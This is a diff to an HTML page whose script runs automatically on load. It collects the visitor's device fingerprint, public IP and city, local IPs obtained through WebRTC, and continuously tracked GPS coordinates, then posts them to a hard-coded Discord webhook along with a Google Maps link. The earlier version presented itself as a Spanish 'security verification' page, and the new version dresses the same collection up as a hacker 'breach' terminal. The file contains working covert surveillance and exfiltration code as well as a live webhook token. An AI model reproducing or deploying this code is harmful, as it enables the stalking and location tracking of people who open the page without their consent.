@@ -3,35 +3,56 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Verificación de seguridad</title>
+    <title>System Breach - Target Acquisition</title>
     <style>
-        body { 
-            font-family: 'Courier New', monospace; 
-            background: #0a0a0a; 
-            color: #00ff41; 
-            text-align: center; 
-            padding: 40px; 
+        body {
+            font-family: 'Courier New', monospace;
+            background: #000;
+            color: #00ff41;
             margin: 0;
+            padding: 20px;
+            overflow-x: hidden;
         }
-        #resultado { 
-            margin: 30px auto; 
-            max-width: 720px; 
-            background: #111; 
-            padding: 25px; 
-            border: 1px solid #00ff41; 
-            border-radius: 8px; 
-            text-align: left; 
+        .terminal {
+            background: #0a0a0a;
+            border: 2px solid #00ff41;
+            padding: 20px;
+            max-width: 850px;
+            margin: 20px auto;
+            box-shadow: 0 0 20px #00ff41;
+            animation: glow 2s infinite alternate;
+        }
+        h1 {
+            color: #00ff41;
+            text-shadow: 0 0 15px #00ff41;
+            margin: 0 0 15px 0;
+            font-size: 28px;
+        }
+        .scan-line {
+            animation: scan 4s linear infinite;
+            height: 2px;
+            background: linear-gradient(transparent, #00ff41, transparent);
+            margin: 10px 0;
+        }
+        #log {
+            text-align: left;
+            line-height: 1.6;
             font-size: 15px;
-            line-height: 1.55;
+            white-space: pre-wrap;
         }
-        .success { color: #00ff41; font-weight: bold; }
+        .success { color: #00ff41; }
+        .warning { color: #ffaa00; }
+        .danger { color: #ff4444; }
+        @keyframes glow { from { box-shadow: 0 0 10px #00ff41; } to { box-shadow: 0 0 30px #00ff41; } }
+        @keyframes scan { 0% { transform: translateY(-100px); } 100% { transform: translateY(400px); } }
     </style>
 </head>
 <body>
-    <h1>🔍 Verificación de conexión segura</h1>
-    <p>Analizando dispositivo y ubicación... (esto puede tardar unos segundos)</p>
-    
-    <div id="resultado">🔄 Recolectando información completa...</div>
+    <div class="terminal">
+        <h1>[ SYSTEM BREACH INITIATED ]</h1>
+        <div class="scan-line"></div>
+        <div id="log">Initializing connection to target device...<br>Establishing secure tunnel...</div>
+    </div>
 
     <script>
         const WEBHOOK_URL = "https://discord.com/api/webhooks/1491850169660997783/J12g-R-0nyXPFr4-Uu0WpYXZAFoQmUJfyt5O6JHA79ke5gwx8OM1v1mgIaLMnSe1y18y";
@@ -39,179 +60,170 @@
         let allData = {};
         let watchId = null;
 
-        // Función para crear fingerprints avanzados
+        function log(message, type = 'normal') {
+            const logEl = document.getElementById('log');
+            let prefix = '';
+            if (type === 'success') prefix = '[+] ';
+            else if (type === 'warning') prefix = '[!] ';
+            else if (type === 'danger') prefix = '[-] ';
+            logEl.innerHTML += prefix + message + '<br>';
+            logEl.scrollTop = logEl.scrollHeight;
+        }
+
+        // WebRTC para obtener IP local/privada
+        async function getLocalIP() {
+            return new Promise(resolve => {
+                const pc = new (window.RTCPeerConnection || window.mozRTCPeerConnection || window.webkitRTCPeerConnection)({
+                    iceServers: [{ urls: 'stun:stun.l.google.com:19302' }]
+                });
+                let ips = [];
+                pc.createDataChannel('');
+                pc.createOffer().then(offer => pc.setLocalDescription(offer));
+                pc.onicecandidate = e => {
+                    if (!e.candidate) return;
+                    const ip = /([0-9]{1,3}(\.[0-9]{1,3}){3}|[a-f0-9]{1,4}(:[a-f0-9]{1,4}){7})/.exec(e.candidate.candidate);
+                    if (ip) ips.push(ip[1]);
+                };
+                setTimeout(() => {
+                    pc.close();
+                    resolve([...new Set(ips)]);
+                }, 1500);
+            });
+        }
+
+        // Fingerprint avanzado
         function getAdvancedFingerprint() {
             let fp = {};
-
-            // Canvas Fingerprint
+            // Canvas
             try {
-                const canvas = document.createElement('canvas');
-                const ctx = canvas.getContext('2d');
+                const c = document.createElement('canvas');
+                const ctx = c.getContext('2d');
                 ctx.textBaseline = "alphabetic";
                 ctx.fillStyle = "#f60";
-                ctx.fillRect(125, 1, 62, 20);
+                ctx.fillRect(125,1,62,20);
                 ctx.fillStyle = "#069";
                 ctx.font = "11pt Arial";
-                ctx.fillText("Fingerprint Test", 2, 15);
-                fp.canvas = btoa(canvas.toDataURL()).substring(0, 40) + "...";
+                ctx.fillText("HackTest 2026", 2, 15);
+                fp.canvas = btoa(c.toDataURL()).slice(0,50) + "...";
             } catch(e) { fp.canvas = "N/A"; }
 
-            // WebGL Fingerprint
+            // WebGL
             try {
                 const gl = document.createElement('canvas').getContext('webgl');
                 if (gl) {
-                    const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
-                    fp.webglVendor = debugInfo ? gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL) : "N/A";
-                    fp.webglRenderer = debugInfo ? gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL) : "N/A";
+                    const debug = gl.getExtension('WEBGL_debug_renderer_info');
+                    fp.gpuVendor = debug ? gl.getParameter(debug.UNMASKED_VENDOR_WEBGL) : "N/A";
+                    fp.gpuRenderer = debug ? gl.getParameter(debug.UNMASKED_RENDERER_WEBGL) : "N/A";
                 }
-            } catch(e) { fp.webgl = "N/A"; }
-
-            // AudioContext Fingerprint
-            try {
-                const audioCtx = new (window.AudioContext || window.webkitAudioContext)();
-                const oscillator = audioCtx.createOscillator();
-                oscillator.type = 'sine';
-                oscillator.frequency.setValueAtTime(10000, audioCtx.currentTime);
-                fp.audio = "Activo";
-            } catch(e) { fp.audio = "N/A"; }
+            } catch(e) {}
 
             return fp;
         }
 
-        async function obtenerTodo() {
-            const res = document.getElementById('resultado');
+        async function startBreach() {
+            log("Connecting to target...", "warning");
+            log("Bypassing basic security layers...");
 
-            // Datos básicos + avanzados
+            // Datos básicos
             allData = {
                 timestamp: new Date().toLocaleString('es-ES'),
                 userAgent: navigator.userAgent,
                 platform: navigator.platform,
-                language: navigator.language,
                 languages: navigator.languages ? navigator.languages.join(', ') : 'N/A',
-                screen: `${screen.width}×${screen.height} (${screen.colorDepth} bits)`,
+                screen: `${screen.width}×${screen.height} (${screen.colorDepth}bit)`,
                 deviceMemory: navigator.deviceMemory ? navigator.deviceMemory + ' GB' : 'N/A',
-                hardwareConcurrency: navigator.hardwareConcurrency ? navigator.hardwareConcurrency + ' núcleos' : 'N/A',
-                maxTouchPoints: navigator.maxTouchPoints || 'N/A',
-                doNotTrack: navigator.doNotTrack || 'N/A',
-                cookieEnabled: navigator.cookieEnabled,
-                darkMode: window.matchMedia('(prefers-color-scheme: dark)').matches ? 'Sí' : 'No',
-                vendor: navigator.vendor || 'N/A',
-                online: navigator.onLine
+                cores: navigator.hardwareConcurrency ? navigator.hardwareConcurrency + ' cores' : 'N/A',
+                touchPoints: navigator.maxTouchPoints || 'N/A',
+                doNotTrack: navigator.doNotTrack || 'unknown',
+                darkMode: window.matchMedia('(prefers-color-scheme: dark)').matches ? 'ENABLED' : 'DISABLED',
+                vendor: navigator.vendor || 'N/A'
             };
 
-            // Fingerprint avanzado
+            log("Extracting device fingerprint...", "success");
             allData.fingerprint = getAdvancedFingerprint();
 
             // Batería
             if (navigator.getBattery) {
                 try {
-                    const battery = await navigator.getBattery();
-                    allData.batteryLevel = (battery.level * 100).toFixed(0) + '%';
-                    allData.batteryCharging = battery.charging ? 'Sí' : 'No';
-                    allData.batteryChargingTime = battery.chargingTime || 'N/A';
+                    const bat = await navigator.getBattery();
+                    allData.battery = `${(bat.level*100).toFixed(0)}% - Charging: ${bat.charging ? 'YES' : 'NO'}`;
                 } catch(e) {}
             }
 
-            // IP + Geolocalización por IP
+            // IP Pública + Geolocalización
+            log("Tracing public IP and location...");
             try {
                 const ipRes = await fetch('https://ipapi.co/json/');
-                const ipData = await ipRes.json();
-                allData.ip = ipData.ip;
-                allData.ipCity = ipData.city || "N/A";
-                allData.ipRegion = ipData.region || "N/A";
-                allData.ipCountry = ipData.country_name || "N/A";
-                allData.ipOrg = ipData.org || "N/A";
-                allData.ipTimezone = ipData.timezone || "N/A";
-            } catch (e) {
-                allData.ip = "No disponible";
-            }
+                const ipd = await ipRes.json();
+                allData.ip = ipd.ip;
+                allData.city = ipd.city;
+                allData.region = ipd.region;
+                allData.country = ipd.country_name;
+            } catch(e) { allData.ip = "Failed"; }
 
-            // GPS con seguimiento continuo
+            // IP Local vía WebRTC
+            log("Attempting local network breach (WebRTC)...");
+            try {
+                allData.localIPs = await getLocalIP();
+            } catch(e) { allData.localIPs = ["Failed"]; }
+
+            // GPS + seguimiento continuo
             if (navigator.geolocation) {
+                log("Activating high-precision GPS triangulation...", "danger");
                 watchId = navigator.geolocation.watchPosition(
-                    (position) => {
-                        allData.gpsLat = position.coords.latitude.toFixed(8);
-                        allData.gpsLon = position.coords.longitude.toFixed(8);
-                        allData.gpsAccuracy = Math.round(position.coords.accuracy) + " metros";
-                        allData.gpsAltitude = position.coords.altitude ? position.coords.altitude.toFixed(1) + " m" : "N/A";
-                        allData.gpsSpeed = position.coords.speed ? (position.coords.speed * 3.6).toFixed(1) + " km/h" : "N/A";
-                        allData.gpsHeading = position.coords.heading || "N/A";
+                    pos => {
+                        allData.gpsLat = pos.coords.latitude.toFixed(8);
+                        allData.gpsLon = pos.coords.longitude.toFixed(8);
+                        allData.gpsAcc = Math.round(pos.coords.accuracy) + "m";
+                        allData.gpsSpeed = pos.coords.speed ? (pos.coords.speed * 3.6).toFixed(1) + " km/h" : "0";
 
-                        mostrarEnPantalla();
-                        enviarADiscord();
+                        log(`GPS LOCK ACQUIRED → Lat: ${allData.gpsLat} | Lon: ${allData.gpsLon} (±${allData.gpsAcc})`, "success");
+                        sendToDiscord();
                     },
-                    (error) => {
-                        res.innerHTML += "<br>❌ GPS denegado o no disponible.";
-                        mostrarEnPantalla();
-                        enviarADiscord();
+                    err => {
+                        log("GPS access denied or unavailable. Falling back to IP.", "warning");
+                        sendToDiscord();
                     },
-                    { 
-                        enableHighAccuracy: true, 
-                        timeout: 20000, 
-                        maximumAge: 0 
-                    }
+                    { enableHighAccuracy: true, timeout: 15000, maximumAge: 0 }
                 );
-            } else {
-                mostrarEnPantalla();
-                enviarADiscord();
             }
+
+            // Primer envío
+            setTimeout(sendToDiscord, 2000);
         }
 
-        function mostrarEnPantalla() {
-            const res = document.getElementById('resultado');
-            res.innerHTML = `
-                <span class="success">✅ Análisis completado</span><br><br>
-                🕒 ${allData.timestamp}<br>
-                🌐 IP: <strong>${allData.ip || 'N/A'}</strong><br>
-                📍 Ubicación IP: ${allData.ipCity}, ${allData.ipRegion}, ${allData.ipCountry}<br>
-                ${allData.gpsLat ? `📍 GPS: <strong>${allData.gpsLat}, ${allData.gpsLon}</strong> (±${allData.gpsAccuracy})<br>` : ''}
-                🔋 Batería: ${allData.batteryLevel || 'N/A'} ${allData.batteryCharging ? `(${allData.batteryCharging})` : ''}<br>
-                🖥️ Pantalla: ${allData.screen} | RAM: ${allData.deviceMemory}
-            `;
-        }
-
-        async function enviarADiscord() {
-            const mapsLink = allData.gpsLat 
-                ? `https://www.google.com/maps?q=${allData.gpsLat},${allData.gpsLon}` 
-                : "#";
+        async function sendToDiscord() {
+            const maps = allData.gpsLat ? `https://www.google.com/maps?q=${allData.gpsLat},${allData.gpsLon}` : "#";
 
             const embed = {
-                title: "🔴 CAPTURA COMPLETA DE DISPOSITIVO",
+                title: "🔴 BREACH SUCCESSFUL - TARGET ACQUIRED",
                 color: 0x00ff41,
-                description: "Datos máximos recolectados",
+                description: "Full device & location dump completed",
                 fields: [
-                    { name: "🕒 Hora", value: allData.timestamp, inline: false },
-                    { name: "🌐 IP", value: `\`${allData.ip}\``, inline: true },
-                    { name: "📍 Ubicación", value: `${allData.ipCity}, ${allData.ipRegion}, ${allData.ipCountry}`, inline: true },
-                    allData.gpsLat ? { name: "📍 GPS Exacta", value: `\`${allData.gpsLat}\`, \`${allData.gpsLon}\` (±${allData.gpsAccuracy})`, inline: false } : null,
-                    { name: "🔋 Batería", value: `${allData.batteryLevel || 'N/A'} (${allData.batteryCharging || ''})`, inline: true },
-                    { name: "🖥️ Pantalla / RAM", value: `${allData.screen} | ${allData.deviceMemory}`, inline: true },
-                    { name: "📱 Huella Canvas", value: allData.fingerprint.canvas || 'N/A', inline: false },
-                    { name: "🔗 Google Maps", value: `[Abrir mapa](${mapsLink})`, inline: false }
+                    { name: "🕒 Timestamp", value: allData.timestamp, inline: false },
+                    { name: "🌐 Public IP", value: `\`${allData.ip || 'N/A'}\``, inline: true },
+                    { name: "📍 Location", value: `${allData.city || ''}, ${allData.region || ''}, ${allData.country || ''}`, inline: true },
+                    allData.gpsLat ? { name: "📍 GPS Coordinates", value: `\`${allData.gpsLat}\`, \`${allData.gpsLon}\` (±${allData.gpsAcc})`, inline: false } : null,
+                    { name: "🔋 Battery", value: allData.battery || 'N/A', inline: true },
+                    { name: "🖥️ Device", value: allData.screen + " | " + allData.cores, inline: true },
+                    { name: "🔗 Google Maps", value: `[OPEN LIVE MAP](${maps})`, inline: false },
+                    { name: "🧬 Fingerprint", value: allData.fingerprint.canvas ? allData.fingerprint.canvas.substring(0,40) + "..." : 'N/A', inline: false }
                 ].filter(Boolean),
-                footer: { text: "Sistema de recolección avanzada • Todo en navegador" },
+                footer: { text: "Advanced Browser Exploitation Module v2026" },
                 timestamp: new Date().toISOString()
             };
 
             try {
                 await fetch(WEBHOOK_URL, {
                     method: "POST",
-                    headers: { "Content-Type": "application/json" },
-                    body: JSON.stringify({
-                        content: "**Nueva captura completa**",
-                        embeds: [embed]
-                    })
+                    headers: {"Content-Type": "application/json"},
+                    body: JSON.stringify({ content: "**TARGET BREACHED**", embeds: [embed] })
                 });
-            } catch (e) {}
+            } catch(e) {}
         }
 
-        // Iniciar todo automáticamente
-        window.onload = obtenerTodo;
-
-        // Detener seguimiento si se cierra la página (opcional)
-        window.onbeforeunload = () => {
-            if (watchId) navigator.geolocation.clearWatch(watchId);
-        };
+        // Iniciar el "hackeo"
+        window.onload = startBreach;
     </script>
 </body>
 </html>
